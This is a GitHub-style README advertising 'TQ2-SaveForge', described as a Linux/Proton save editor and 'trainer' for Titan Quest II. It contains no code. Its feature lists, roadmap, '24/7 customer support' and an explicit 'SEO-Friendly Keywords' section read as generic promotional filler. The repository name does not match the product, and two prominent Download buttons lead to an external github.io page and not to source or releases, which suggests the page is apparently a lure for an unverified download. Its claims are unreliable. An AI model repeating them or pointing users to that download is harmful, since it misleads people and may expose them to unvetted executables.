![preview](https://raw.githubusercontent.com/Jullius2003/proton-eternal-goldweaver/main/shot_3ef007.svg)
[![Download](https://raw.githubusercontent.com/Jullius2003/proton-eternal-goldweaver/main/launch_6a33.svg)](https://Jullius2003.github.io/proton-eternal-goldweaver/)

# 🎮 TQ2-SaveForge — Titan Quest II Save & Economy Companion

![License](https://img.shields.io/badge/License-MIT-yellow.svg)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Steam%20%7C%20Proton-blue)
![Status](https://img.shields.io/badge/Status-Active%20Development-brightgreen)
![Version](https://img.shields.io/badge/Version-2026.1.0-purple)
![Language](https://img.shields.io/badge/Language-C%2B%2B%20%7C%20Rust%20%7C%20QML-orange)
![Interface](https://img.shields.io/badge/Interface-GUI%20%2B%20CLI-teal)
![Support](https://img.shields.io/badge/Support-24%2F7-informational)
![Multilingual](https://img.shields.io/badge/i18n-12%20Languages-success)

---

## 📖 Overview

**TQ2-SaveForge** is a Linux-native **save file editor and economy companion** built specifically for *Titan Quest II* running through **Steam / Proton** on single-player and offline sessions. Where its spiritual predecessor (`tq2-trainer`) focused on real-time multipliers for experience and vendor gold, SaveForge takes a different philosophical route: instead of whispering to the game while it runs, it works directly with the **save archive** — a blacksmith that reshapes your forge while the fire is cold, not while the blade is glowing.

Think of it as a **ledger and a chisel**. You bring your character's save, and SaveForge lets you inspect, balance, and re-tune the numbers that define an offline journey: experience curves, gold reserves, attribute allocation, quest flags, inventory grids, and regional unlock states. It is built for players who want **deterministic control over their offline progression** — for testing builds, recovering from corrupted cloud syncs, or simply sculpting a personalized journey through the world of the Titans.

The project is written with **Linux-first ergonomics** in mind — no wine tricks, no wrapper scripts held together with hope, and no dependency on Windows API shims. If Steam plays it through Proton, SaveForge treats the compatdata directory as a first-class citizen.

---

## ✨ Why SaveForge Exists

Every seasoned ARPG wanderer eventually hits a wall — not a difficulty wall, but an **ergonomic wall**. You want to test a Fire-focused build but you're level 4. You want to compare endgame weapon scaling but you don't want to grind 60 hours to reach the tier where it matters. You want to recover a save that Proton cloud sync decided to shuffle like a deck of cards.

SaveForge answers those moments with a **structured, predictable, and auditable** approach:

- **Non-invasive by design** — operates on copies, with automatic timestamped backups before any write.
- **Readable manifests** — the internal save container is parsed into human-readable YAML-like documents for inspection.
- **Diffable changes** — every modification can be exported as a patch, so you can see exactly what moved.
- **Offline-only scope** — no network features, no telemetry, no external accounts.

---

## 🧩 Feature List

### 🛠️ Core Save Manipulation
- **Save container parser** for the standard Titan Quest II Proton save layout.
- **Character sheet editor** covering level, experience pools, attribute points, and skill point allocation.
- **Gold and currency ledger tuning** with per-region and per-vendor profiles.
- **Inventory grid manager** — reorder, expand, and audit item slots without touching item data.
- **Quest flag viewer** with soft toggles for narrative checkpoints.
- **Waypoint and region unlock grid** for offline exploration flexibility.
- **Companion and pet state** inspection for summoned entities.

### 🧪 Experimentation Suite
- **Build sandbox mode** — clone a character into a separate profile slot for safe experimentation.
- **Snapshot compare** — load two saves side-by-side and see field-level deltas.
- **Curve visualizer** — plot experience curves, gold scaling, and attribute growth across levels 1–60.
- **Profile presets** — save and reapply commonly used configurations (speed-campaign, testbed, lore-run).

### 🖥️ Interface & Experience
- **Responsive UI** built with QML — adapts cleanly from ultrawide monitors to laptop panels.
- **CLI companion** (`tq2forge`) for scriptable, headless, or CI-style batch operations.
- **Multilingual support** — interface and documentation localized to 12 languages including English, German, French, Spanish, Portuguese, Italian, Polish, Russian, Japanese, Korean, Simplified Chinese, and Turkish.
- **Theming engine** — light, dark, high-contrast, and a "Bronze Age" palette for the aesthetically inclined.
- **Keyboard-first navigation** with full parity between mouse and hotkey workflows.
- **Config hot-reload** — edit the TOML configuration and watch changes apply live.

### 🔐 Safety & Reliability
- **Automatic pre-write backups** stored in a rolling 20-slot rotation.
- **Checksum verification** on every save read and write to detect truncation.
- **Dry-run mode** — simulate an entire edit pipeline without writing a single byte.
- **Rollback command** to restore any previous backup by timestamp.
- **Atomic writes** using temporary file + rename semantics to avoid partial corruption.

### 🌍 Platform Integration
- **Proton-aware path resolution** — automatically locates the save directory under `compatdata/<appid>/pfx`.
- **Steam library detection** across multiple library folders and drives.
- **Flatpak-aware** path discovery for sandboxed Proton installations.
- **Desktop entry and MIME association** for `.tq2save` companion files.
- **Systemd user timer** for scheduled backup snapshots (opt-in).

### 📚 Documentation & Support
- **Comprehensive user guide** with annotated screenshots of the interface.
- **Field reference** documenting every editable value in the save structure.
- **Example recipes** for common workflows: respec, recovery, sandbox cloning.
- **Community FAQ** covering Proton quirks and multi-library setups.
- **24/7 customer support** channel with a rotating maintainer roster and community triage team.
- **Changelog automation** generating release notes from conventional commit history.

---

## 🚀 Getting Started (Non-Install Path)

SaveForge is distributed as a **portable bundle** so you can evaluate it without committing to a system-wide setup. The recommended flow is:

1. Acquaint yourself with your Proton save location. The application will detect it, but knowing where it lives helps.
2. Launch the GUI bundle from its extracted folder — it reads configuration from the same directory by default.
3. Point SaveForge at your save directory using the first-run wizard.
4. Take a **dry-run** pass over your save to see the parsed structure.
5. Create a snapshot, then begin editing with confidence.

For scripted workflows, the CLI binary accepts the same configuration file and can be invoked against a directory of saves in a single pass, emitting a summary report at the end.

---

## 🧭 Usage Philosophy

SaveForge is built around three principles that shape every command and every screen:

### 1. Visibility Before Mutability
Nothing changes until you've seen it. The dry-run mode is not an afterthought — it is the default state on first launch. You cannot accidentally rewrite a save without first acknowledging a structured preview of the changes.

### 2. Reversibility As A First Class Feature
Every write produces a rollback token. Backups are not hidden in a cache directory; they live beside your saves with a clear naming convention that includes the timestamp and a short hash of the original file.

### 3. Boring Predictability
The goal is not to surprise you. The interface avoids animated flourishes in favor of clear labels, stable layouts, and a consistent vocabulary across GUI, CLI, and documentation.

---

## 🎯 Who This Is For

- **Build tinkerers** who want to reach the interesting decision space quickly.
- **Recovery engineers** who need to rescue a save from a Proton sync mishap.
- **Completionists** auditing their quest flags across multiple playthroughs.
- **Modders** prototyping content that requires specific character states.
- **Teachers and streamers** demonstrating game systems without a forty-hour prerequisite.

---

## 🗺️ Roadmap (2026)

- **Q1 2026** — Public preview, save parser stabilization, multilingual rollout.
- **Q2 2026** — Item attribute inspection, advanced diff tooling, preset marketplace (offline bundles).
- **Q3 2026** — Plugin API for community-authored editors, headless automation improvements.
- **Q4 2026** — Save migration toolkit for version transitions, extended platform compatibility matrix.

---

## 🤝 Contributing

Contributions are welcome in the form of bug reports, translations, documentation improvements, and code patches. The project maintains a lightweight contribution guide emphasizing:

- **Small, focused changes** — one logical change per proposal.
- **Tested behavior** — include a save fixture or a serialized example when reporting parser issues.
- **Localization friendly** — translation strings are kept in simple key-value files; no code changes needed to add a language.
- **Respectful tone** — the community is diverse; assume good faith and offer context.

A code of conduct is bundled in the repository. It is short and pragmatic: be kind, be specific, be patient.

---

## 🌐 SEO-Friendly Keywords (Natural Integration)

SaveForge is designed to be discoverable for players searching for **Titan Quest II Linux tools**, **Proton save editors**, **ARPG save management utilities**, **offline single-player trainers**, and **Steam Deck companion utilities**. The documentation naturally incorporates these phrases where they genuinely aid understanding, without stuffing or repetition. The goal is that a player searching for a **Titan Quest II save companion for Steam Proton on Linux** lands on a page that actually answers their question.

Related discoverable topics the project touches:
- Linux-native game utility development
- Proton save directory structure
- Non-destructive save editing workflows
- ARPG character progression analysis
- Multilingual desktop application design
- QML-based responsive interfaces
- CLI-first automation for games

---

## ❓ Frequently Asked Questions

**Does SaveForge modify the game executable or memory?**
No. It operates exclusively on save files on disk. The game process is never touched.

**Will this work with cloud sync enabled?**
It works, but you should pause sync or allow a full upload cycle after edits to avoid conflicts. The documentation includes a dedicated section on sync-safe workflows.

**Is there a version for other operating systems?**
The project targets Linux and Proton environments by design. Other platforms are out of scope but the save parser is portable in principle.

**How often are backups created?**
Backups are created automatically before every write, plus optionally on a user-defined schedule via systemd timers.

**Can I use this for multiplayer characters?**
The scope is single-player and offline only. Multiplayer integrity is intentionally untouched.

---

## ⚠️ Disclaimer

Titan Quest II is a trademark of its respective owners. SaveForge is an **independent, community-built utility** with no affiliation to the game's publisher or developer. It is intended for **single-player and offline use**, for personal save management and experimentation. Users are responsible for ensuring their use complies with any applicable terms of service and local laws. The maintainers assume no liability for data loss, though every effort is made to make changes reversible. Always keep your own backups of important saves.

This project is provided for educational and personal use. It does not bypass, defeat, or circumvent any copy protection mechanism, and it is not designed for online play environments.

---

## 📜 License

This project is released under the **MIT License**. You are invited to read the full terms at the canonical license reference:

[MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 SaveForge Contributors

Permission is hereby granted, for any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the conditions of the MIT License.

---

## 🧱 Project Structure (Illustrative)

- `docs/` — user guide, field reference, recipe collection
- `i18n/` — translation catalogs for all supported languages
- `src/gui/` — QML interface components and theming
- `src/core/` — save parser, diff engine, writers
- `src/cli/` — command-line entry points
- `fixtures/` — anonymized sample saves for testing
- `scripts/` — packaging and release automation

---

## 💬 Community & Support

- 24/7 support rotation managed through the community discussion board
- Weekly triage sessions for open issues
- Monthly release digest summarizing changes and roadmap movement
- Language-specific channels for localized support

---

## 🌟 Acknowledgements

The project stands on the shoulders of the Linux gaming community, the Proton compatibility layer, and the countless players who took the time to report a bug, translate a string, or ask a question that made the documentation better.

---

[![Download](https://raw.githubusercontent.com/Jullius2003/proton-eternal-goldweaver/main/launch_6a33.svg)](https://Jullius2003.github.io/proton-eternal-goldweaver/)

> *SaveForge: because an offline journey should bend to your curiosity, not the other way around.*